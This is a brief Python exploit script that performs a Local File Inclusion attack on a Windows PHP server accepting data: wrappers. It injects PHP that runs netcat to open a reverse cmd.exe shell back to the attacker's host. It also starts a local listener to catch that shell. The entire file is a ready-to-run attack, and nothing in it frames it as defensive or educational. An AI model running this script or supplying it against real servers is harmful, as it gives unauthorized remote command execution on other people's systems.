#!/usr/bin/python3
#WRITTEN FOR A PHP SERVER RUNNING ON !!!WINDOWS!!!
#does a Local File Inclusion attack against php server that allows data wrappers
#returns a shell

import requests,subprocess

target=input('target ip:   ')
port=input('litening port: ')
remote_ip=input('host ip:  ')


payload="http://{}/menu.php?file=data:text/plain,get wrecked<?php echo shell_exec('nc -nv {} {} -e cmd.exe')?>)".format(target,remote_ip,port)

subprocess.Popen(['nc','-nvlp',port])
requests.get(payload)
sys.exit()

